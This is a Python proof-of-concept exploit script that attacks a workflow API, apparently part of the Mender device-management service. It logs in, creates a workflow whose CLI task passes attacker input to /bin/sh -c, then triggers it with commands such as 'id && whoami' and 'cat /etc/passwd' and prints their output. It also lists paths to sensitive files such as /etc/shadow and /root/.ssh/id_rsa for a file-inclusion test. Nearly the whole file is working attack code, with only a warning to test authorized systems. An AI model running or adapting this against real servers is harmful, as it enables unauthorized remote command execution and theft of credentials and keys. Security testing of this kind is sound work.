#!/usr/bin/env python3
"""
Proof of Concept: Command Injection in Workflow CLI Task Execution
Vulnerability #4 - CRITICAL

This POC demonstrates how an attacker could execute arbitrary commands
through workflow CLI tasks if they can create or modify workflows.

WARNING: Only use this on systems you own or have explicit permission to test.
This POC creates workflows that execute commands - use extreme caution!
"""

import requests
import json
import sys
import time

def login(base_url, email, password):
    """Login and get JWT token"""
    print(f"[*] Attempting to login as {email}...")
    
    url = f"{base_url}/api/management/v1/useradm/auth/login"
    response = requests.post(
        url,
        headers={"Content-Type": "application/json"},
        auth=(email, password),
        json={},
        verify=False
    )
    
    if response.status_code == 200:
        token = response.text.strip()
        print(f"[+] Login successful!")
        return token
    else:
        print(f"[-] Login failed: {response.status_code}")
        return None

def create_malicious_workflow(base_url, token, command):
    """
    Create a workflow with a CLI task that executes the injected command
    """
    print(f"\n[*] Creating malicious workflow with command injection...")
    print(f"    Command: {command}")
    
    # Create workflow definition with command injection
    workflow = {
        "name": "test-cli-injection",
        "description": "Test workflow for command injection POC",
        "version": 1,
        "tasks": [
            {
                "name": "cli-task",
                "type": "cli",
                "requires": [],
                "command": ["/bin/sh", "-c", f"${{workflow.input.command}}"],
                "execution_timeout": 30
            }
        ],
        "schema": {
            "command": {
                "type": "string",
                "description": "Command to execute"
            }
        }
    }
    
    url = f"{base_url}/api/workflows/v1/workflows"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    response = requests.post(url, headers=headers, json=workflow, verify=False)
    
    if response.status_code in [200, 201]:
        print(f"[+] Workflow created successfully")
        return True
    else:
        print(f"[-] Failed to create workflow: {response.status_code}")
        print(f"    Response: {response.text}")
        return False

def trigger_workflow_with_injection(base_url, token, workflow_name, malicious_command):
    """
    Trigger the workflow with a malicious command in the input parameters
    """
    print(f"\n[*] Triggering workflow with command injection...")
    print(f"    Malicious command: {malicious_command}")
    
    url = f"{base_url}/api/workflows/v1/workflow/{workflow_name}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # The command injection happens here - user input is directly used in exec.CommandContext
    payload = {
        "command": malicious_command
    }
    
    response = requests.post(url, headers=headers, json=payload, verify=False)
    
    if response.status_code in [200, 201, 202]:
        result = response.json()
        job_id = result.get("id") or result.get("workflow_id")
        print(f"[+] Workflow triggered! Job ID: {job_id}")
        return job_id
    else:
        print(f"[-] Failed to trigger workflow: {response.status_code}")
        print(f"    Response: {response.text}")
        return None

def check_job_result(base_url, token, job_id):
    """
    Check the result of the workflow job to see command output
    """
    print(f"\n[*] Checking job result...")
    
    url = f"{base_url}/api/workflows/v1/job/{job_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # Poll for results
    for i in range(10):
        time.sleep(2)
        response = requests.get(url, headers=headers, verify=False)
        
        if response.status_code == 200:
            result = response.json()
            status = result.get("status", "unknown")
            print(f"    Status: {status}")
            
            if status == "done":
                tasks = result.get("tasks", [])
                for task in tasks:
                    if task.get("type") == "cli":
                        cli_result = task.get("result", {}).get("CLI", {})
                        output = cli_result.get("Output", "")
                        error = cli_result.get("Error", "")
                        exit_code = cli_result.get("ExitCode", -1)
                        
                        print(f"\n[!] COMMAND EXECUTED!")
                        print(f"    Exit Code: {exit_code}")
                        print(f"    Output:\n{output}")
                        if error:
                            print(f"    Error:\n{error}")
                        return True
            elif status == "failed":
                print(f"    Job failed")
                return False
        
        print(f"    Waiting for job completion... ({i+1}/10)")
    
    return False

def test_path_traversal(base_url, token):
    """
    Test path traversal in processJobStringOrFile function
    """
    print(f"\n[*] Testing path traversal in file inclusion...")
    
    # Try to read sensitive files using @ prefix
    malicious_paths = [
        "@/etc/passwd",
        "@/etc/shadow",
        "@/proc/version",
        "@/var/log/syslog",
        "@/root/.ssh/id_rsa"
    ]
    
    for path in malicious_paths:
        print(f"\n    Testing path: {path}")
        # This would be used in a workflow task that processes files
        # The vulnerability is in processJobStringOrFile() function
        
    print(f"    [NOTE] Path traversal test requires workflow modification")

def main():
    print("=" * 70)
    print("POC: Command Injection in Workflow CLI Task Execution")
    print("Vulnerability #4 - CRITICAL")
    print("=" * 70)
    print("\n[!] WARNING: This POC attempts to execute commands on the server!")
    print("[!] Only run this in a controlled test environment!")
    
    if len(sys.argv) < 2:
        print("\nUsage: python3 vulnerability_4_command_injection.py <base_url>")
        print("Example: python3 vulnerability_4_command_injection.py https://staging.hosted.mender.io")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Configuration
    email = "test@example.com"
    password = "testpassword"
    
    # Login
    token = login(base_url, email, password)
    if not token:
        print("[-] Cannot proceed without authentication token")
        sys.exit(1)
    
    # Test 1: Simple command injection
    print("\n" + "=" * 70)
    print("TEST 1: Simple Command Injection")
    print("=" * 70)
    
    workflow_name = "test-cli-injection"
    malicious_command = "id && whoami && pwd"
    
    if create_malicious_workflow(base_url, token, malicious_command):
        job_id = trigger_workflow_with_injection(base_url, token, workflow_name, malicious_command)
        if job_id:
            check_job_result(base_url, token, job_id)
    
    # Test 2: Data exfiltration
    print("\n" + "=" * 70)
    print("TEST 2: Data Exfiltration Attempt")
    print("=" * 70)
    
    exfil_command = "cat /etc/passwd | head -20"
    job_id = trigger_workflow_with_injection(base_url, token, workflow_name, exfil_command)
    if job_id:
        check_job_result(base_url, token, job_id)
    
    # Test 3: Path traversal
    print("\n" + "=" * 70)
    print("TEST 3: Path Traversal in File Inclusion")
    print("=" * 70)
    test_path_traversal(base_url, token)
    
    print("\n" + "=" * 70)
    print("[!] POC Complete")
    print("[!] If commands executed successfully, the system is vulnerable")
    print("=" * 70)

if __name__ == "__main__":
    main()

